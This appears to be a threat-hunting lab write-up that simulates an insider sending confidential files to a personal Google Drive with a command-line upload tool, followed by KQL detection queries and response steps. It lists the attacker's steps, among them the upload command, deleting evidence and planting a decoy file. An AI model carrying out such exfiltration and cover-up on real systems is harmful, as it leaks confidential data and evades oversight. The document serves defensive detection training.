# 🔍 Threat Hunt: Unauthorized Data Exfiltration via Notepad++ and Google Drive CLI

---

## 📌 Threat Event  
**Title:** Insider Exfiltration via Notepad++ and gdrive.exe  
**Objective:** Detect covert file staging and upload of sensitive content using trusted tools

---

## 🧪 Steps the "Bad Actor" Took (to Create Logs and IoCs)

1. Downloaded and launched **Notepad++ (portable version)** to open/stage sensitive internal reports.
2. Installed the **Google Drive CLI tool (`gdrive.exe`)** on the desktop.
3. Authenticated the tool via a personal Google account.
4. Created a folder named `Performance_Review_Q2` with `.pdf`, `.xlsx`, and `.docx` files.
5. Zipped the folder into `confidential_pack.zip`.
6. Executed: `gdrive.exe upload confidential_pack.zip` to send files externally.
7. Deleted all original files and ZIP archive.
8. Created a decoy file: `Q2_PlanningNotes.txt`.
9. Removed both `gdrive.exe` and Notepad++ files from the system.

---

## 🔎 MDE Tables Used to Detect IoCs

| Table                 | Description                                                               |
|----------------------|---------------------------------------------------------------------------|
| `DeviceFileEvents`   | Detected ZIP file creation and deletion; decoy file creation              |
| `DeviceProcessEvents`| Tracked usage of `gdrive.exe` and Notepad++                               |
| `DeviceNetworkEvents`| Logged outbound connections to Google Drive upload APIs                   |

📚 References:
- [DeviceFileEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table)  
- [DeviceProcessEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table)  
- [DeviceNetworkEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table)

---

## 🧠 Detection Queries

```kusto
// Detect ZIP archive creation
DeviceFileEvents
| where FileName endswith ".zip"
| where FolderPath has_any("Documents", "Desktop")
| project Timestamp, DeviceName, FileName, ActionType, FolderPath

// Detect gdrive CLI execution
DeviceProcessEvents
| where FileName == "gdrive.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// Detect outbound connection to Google Drive
DeviceNetworkEvents
| where RemoteUrl has "googleapis" or RemoteUrl has "drive.google.com"
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl, RemoteIP

// Detect deletion of staged files and archives
DeviceFileEvents
| where FileName has "confidential_pack.zip" or FileName contains "Performance_Review_Q2"
| where ActionType == "FileDeleted"

// Detect decoy file creation
DeviceFileEvents
| where FileName == "Q2_PlanningNotes.txt"
| where ActionType == "FileCreated"
```
## 🗂️ Chronological Events

- Portable Notepad++ extracted to desktop and launched  
- Sensitive files staged and edited in `Performance_Review_Q2` folder  
- Folder zipped into `confidential_pack.zip`  
- `gdrive.exe` used to upload the ZIP file to a personal Google account  
- Artifacts deleted post-transfer, decoy file `Q2_PlanningNotes.txt` created to divert suspicion  
- CLI tool and portable app removed to cover tracks  

---

## ✅ Summary

This scenario simulates an insider threat actor exfiltrating confidential company data using a blend of commonly approved tools. Despite using legitimate applications like Notepad++ and Google Drive CLI, the pattern of compressed file staging, command-line execution, and immediate deletion created a footprint that defenders can detect when monitoring for subtle anomalies. This reinforces the importance of visibility across file events, process executions, and network traffic—even when the tools involved appear benign.

---

## 🚨 Response Taken

- The compromised endpoint `WORKSTATION-112` was isolated immediately  
- The associated user account was disabled pending a full investigation  
- Forensic logs and file artifacts were preserved  
- Security policies were updated to restrict CLI-based upload tools  

---

## ✍️ Created By

**Author:** Giuseppe Scalzo  
**Date:** June 1, 2025
